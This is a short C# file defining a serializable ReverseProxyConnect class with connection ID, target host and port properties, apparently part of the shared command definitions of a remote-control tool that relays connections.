using System;

namespace Orcus.Shared.Commands.ReverseProxy
{
    [Serializable]
    public class ReverseProxyConnect
    {
        public int ConnectionId { get; set; }

        public string Target { get; set; }

        public int Port { get; set; }
    }
}